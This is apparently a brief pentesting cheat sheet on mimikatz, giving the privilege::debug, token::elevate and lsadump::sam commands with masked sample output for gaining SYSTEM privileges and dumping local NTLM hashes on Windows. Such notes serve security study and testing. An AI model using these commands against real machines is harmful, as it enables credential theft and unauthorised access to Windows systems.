# mimikatz

### Resources

1. The Hacker tools

{% embed url="https://tools.thehacker.recipes/mimikatz" %}

### Basic commands

1. View privilege configurations (?)

* Required to perform actions such as `lsadump::sam` later on

```
mimikatz # privilege::debug
Privilege '20' OK
```

2. To impersonate a token

* particularly, a token from `SYSTEM`

{% embed url="https://docs.velociraptor.app/artifact_references/pages/windows.detection.impersonation/" %}

```
mimikatza # token::elevate

Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

660     xxxx         NT AUTHORITY\SYSTEM     xxxx       (04g,21p)       Primary
 -> Impersonated !
 * Process Token : xxxx     XXXX     xxxx   (12g,24p)  Primary
 * Thread Token  : {0;000003e7} 1 D 1309519     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

```

3. Dump the local Security Account Manager (SAM) NT hashes

```
mimikatz # lsadump::sam
Domain : xxxx
SysKey : xxxx
Local SID : xxxx

SAMKey : xxxx

RID  : xxxx (500)
User : Administrator
  Hash NTLM: xxxx
  
...
```

